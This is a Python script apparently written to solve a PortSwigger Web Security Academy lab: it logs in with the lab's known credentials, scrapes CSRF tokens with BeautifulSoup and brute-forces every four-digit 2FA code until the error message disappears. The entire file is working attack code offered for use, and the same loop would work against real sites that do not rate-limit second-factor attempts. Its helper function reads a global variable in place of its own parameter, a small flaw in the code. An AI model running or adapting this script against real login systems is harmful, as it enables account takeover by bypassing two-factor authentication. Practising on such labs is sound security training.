import sys
import requests
from bs4 import BeautifulSoup


# Portswigger Lab: 2FA bypass using a brute-force attack
# Solve faster without burpsuite pro.
# Change target_url and target_2fa to your lab url!

def get_csrf_token(_response):
    soup = BeautifulSoup(response.text, 'html.parser')
    return soup.select_one('[name="csrf"]')['value']


target_url = "https://some.web-security-academy.net/login"  # Change this
target_2fa = "https://some.web-security-academy.net/login2"  # Change this
username = "carlos"
password = "montoya"

session = requests.Session()

for code in range(10000):
    response = session.get(target_url)
    csrf_token = get_csrf_token(response)
    post_data = "username=" + username + "&password=" + password + "&csrf=" + csrf_token
    session.post(target_url, data=post_data)

    response = session.get(target_2fa)
    csrf_token = get_csrf_token(response)

    num = "0" * (4 - len(str(code))) + str(code)
    post_2fa = "mfa-code=" + num + "&csrf=" + csrf_token
    print("Try " + num)
    response = session.post(target_2fa, data=post_2fa)

    if "Incorrect security code" not in response.content.decode():
        print("FOUND 2FA CODE " + num)
        print("Response code ", response.status_code)
        print(response.content.decode())
        sys.exit(0)
    if response.status_code != 200:
        print("Error response status: ", response.status_code)
        sys.exit(0)
